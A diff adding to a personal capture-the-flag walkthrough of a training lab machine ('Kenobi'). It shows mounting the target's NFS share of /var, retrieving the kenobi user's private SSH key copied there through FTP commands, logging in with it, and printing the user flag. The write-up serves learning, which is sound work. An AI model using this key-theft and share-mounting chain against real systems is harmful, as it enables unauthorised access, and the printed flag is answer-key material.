@@ -283,3 +283,52 @@ We know that the FTP service is running as the Kenobi user (from the file on the
 We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
 
 ![[Pasted image 20220815233300.png]]
+
+We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
+
+Lets mount the /var/tmp directory to our machine
+
+```
+mkdir /mnt/kenobiNFS
+mount machine_ip:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+```
+
+![[Pasted image 20220816000703.png]]
+![[Pasted image 20220816000716.png]]
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
+└─$ sudo chmod 600 id_rsa                       
+                                                                                                                       
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
+└─$ ssh -i id_rsa kenobi@10.10.167.232
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ 
+
+```
+
+What is Kenobi's user flag (/home/kenobi/user.txt)?
+- d0b0f3f53b6caa532a83915e19224899
+
+```
+kenobi@kenobi:~$ ls
+share  user.txt
+kenobi@kenobi:~$ cat user.txt 
+d0b0f3f53b6caa532a83915e19224899
+kenobi@kenobi:~$ 
+
+```
